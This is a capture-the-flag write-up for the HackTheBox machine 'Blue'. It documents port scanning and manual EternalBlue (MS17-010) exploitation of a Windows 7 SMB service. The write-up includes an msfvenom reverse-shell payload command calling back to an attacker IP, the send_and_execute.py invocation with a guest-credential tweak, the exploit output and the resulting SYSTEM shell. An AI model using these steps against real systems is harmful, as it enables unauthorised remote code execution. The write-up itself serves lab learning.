---
title: Blue Machine Writeup- HackTheBox
date: 2020-12-9 10:30:00
excerpt: A retired windows box from HackTheBox, vulnerable to EternalBlue (MS17-010), exploited manually and gained 
         SYSTEM access.
thumbnail: /assets/images/Blue/info.png
categories:
- HTB
- Writeup
- Machine
tags:
- Windows
- EternalBlue
- MS17-010
- without metasploit
---

![Info](/assets/images/Blue/info.png)

# Methodology
1. Open Ports Enumeration
2. SMB Service Enumeration
3. MS17-010 vulnerability identified
4. SYSTEM shell gained through manual exploit

# Lessons Learned
1. EternalBlue exploit
2. Manual exploitation of MS17-010

# Open Ports Enumeration
The open ports enumeration through targetRecon[^fn1], had identified three open ports namely, **MSRPC** (135),
**NETBIOS-SSN** (139) and **MICROSOFT-DS** (445). The results of the scan are given below.
``` 
[b4bygroot☮arcolinux]-(~/HTB/Tracks/Beginner/Blue)
└> targetRecon 10.10.10.40
[+] Open Ports Scan
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
		135     msrpc
		139     netbios-ssn
		445     microsoft-ds
[+] Scripts Scan
				 nmap -sV -A --script=default,vuln -p 135 10.10.10.40
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.

Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-09 16:50 IST
Nmap scan report for 10.10.10.40 (10.10.10.40)
Host is up (0.21s latency).

PORT    STATE SERVICE VERSION
135/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.21 seconds

				 nmap -sV -A --script=default,vuln -p 139 10.10.10.40
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.

Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-09 16:50 IST
Nmap scan report for 10.10.10.40 (10.10.10.40)
Host is up (0.20s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Microsoft Windows netbios-ssn
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
|_smb2-security-mode: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!
|_smb2-time: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.36 seconds

				 nmap -sV -A --script=default,vuln -p 445 10.10.10.40
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.

Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-09 16:51 IST
Nmap scan report for 10.10.10.40 (10.10.10.40)
Host is up (0.20s latency).

PORT    STATE SERVICE      VERSION
445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 8m10s, deviation: 4s, median: 8m07s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-12-09T11:30:26+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-12-09T11:30:24
|_  start_date: 2020-12-09T11:21:10

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.89 seconds

[+] Summary 
135     msrpc   Microsoft Windows RPC N/A
				No vuln found
139     netbios-ssn     Microsoft Windows netbios-ssn N/A
				No vuln found
445     microsoft-ds    Windows 7 Professional 7601 Service Pack 1 microsoft-ds N/A
Vulnerabilities
['smb-vuln-ms17-010']
```

# SMB Service Enumeration
As seen from the results on the previous section, the SMB service on the target is vulnerable to 
**EternalBlue (MS17-010)**. There is a well written, functioning module on *metasploit* that could work. Since the 
focus is on owning the target without metasploit, *Google-Fu* on manual exploitation methods were carried out.

# Foothold
Google search had listed numerous good resources on how to exploit EternalBlue manually. An interesting article from the 
lot, **Exploiting MS17-010 without Metasploit (Win XP SP3)**[^fn2], was chosen for this target. It involves using 
**send_and_execute.py**[^fn3] with its dependencies **Impacket**[^fn4] and **mysmb**[^fn5] installed.

> Note: While, impacket can be installed directly through *pip*, *mysmb* had to be downloaded manually. There are
> numerous mysmb options available on GitHub, one such instance used to exploit the machine is listed on [^fn5].
> The exploits from **Exploit-DB** would also work, but need some similar customization as send_and_execute.py

After downloading send_and_execute.py and installing necessary dependencies, the exploit was browsed through to 
understand the process. The exploit works by uploading a user-specified **payload** onto the target using *PIPE* and
executing it. A payload was then generated using *msfvenom* through the command, 
`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.7 LPORT=9095 EXITFUNC=thread -f exe -a x86 --platform windows -o ms17-010.exe`.
With the payload generated, and a netcat listener on port 9095 of the attacking host, the script was executed as
`python2.7 send_and_execute.py 10.10.10.40 ms17-010.exe`, resulting in a failed attempt with the message
*"Not found accessible named pipe"*. After researching further, trying the exploit again with a different username
seemed a reasonable option. The *USERNAME* on the python script was changed to **guest** as shown in the section below.
```python
USERNAME = 'guest'
PASSWORD = ''
```
The script was executed again after initiating a netcat listener on the attacking host. This time the exploit worked,
resulting in a reverse shell from the target and the same is shown on the section given below.
``` 
[-----TERMINAL-1-----]
Beginner/Blue [ python2.7 send_and_execute.py 10.10.10.40 ms17-010.exe                     ] 8:01 PM
Trying to connect to 10.10.10.40:445
Target OS: Windows 7 Professional 7601 Service Pack 1
Using named pipe: browser
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
CONNECTION: 0xfffffa800482c020
SESSION: 0xfffff8a001885060
FLINK: 0xfffff8a00187f048
InParam: 0xfffff8a0019a215c
MID: 0x1302
unexpected alignment, diff: 0x-123fb8
leak failed... try again
CONNECTION: 0xfffffa800482c020
SESSION: 0xfffff8a001885060
FLINK: 0xfffff8a0019b4088
InParam: 0xfffff8a0019ae15c
MID: 0x1303
success controlling groom transaction
modify trans1 struct for arbitrary read/write
make this SMB session to be SYSTEM
overwriting session security context
Sending file 2CM2VQ.exe...
Opening SVCManager on 10.10.10.40.....
Creating service vWCH.....
Starting service vWCH.....
The NETBIOS connection with the remote host timed out.
Removing service vWCH.....
ServiceExec Error on: 10.10.10.40
nca_s_proto_error
Done

[-----TERMINAL-2-----]
➜  Blue  nc -nvlp 9095                                         
Connection from 10.10.10.40:49158
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>type root.txt
type root.txt
ff548eb71e920ff6c08843ce9df4e717
C:\Users\Administrator\Desktop>cd C:\Users
cd C:\Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\Users

21/07/2017  06:56    <DIR>          .
21/07/2017  06:56    <DIR>          ..
21/07/2017  06:56    <DIR>          Administrator
14/07/2017  13:45    <DIR>          haris
12/04/2011  07:51    <DIR>          Public
			   0 File(s)              0 bytes
			   5 Dir(s)  15,888,822,272 bytes free

C:\Users>cd haris\Desktop 
cd haris\Desktop

C:\Users\haris\Desktop>type user.txt
type user.txt
4c546aea7dbee75cbd71de245c8deea9
```
![SYSTEM Shell](/assets/images/Blue/shell.png)

# System Owned
![System Owned](/assets/images/Blue/systemown.svg)

# Resources
[^fn1]:[targetRecon](https://github.com/b4bygroot/TargetRecon)
[^fn2]:[Exploiting MS17-010 without Metasploit (Win XP SP3)](https://ivanitlearning.wordpress.com/2019/02/24/exploiting-ms17-010-without-metasploit-win-xp-sp3/)
[^fn3]:[send_and_execute.py](https://github.com/helviojunior/MS17-010/blob/master/send_and_execute.py)
[^fn4]: Impacket can be installed through *pip install impacket*
[^fn5]: [mysmb.py](https://github.com/worawit/MS17-010/blob/master/mysmb.py)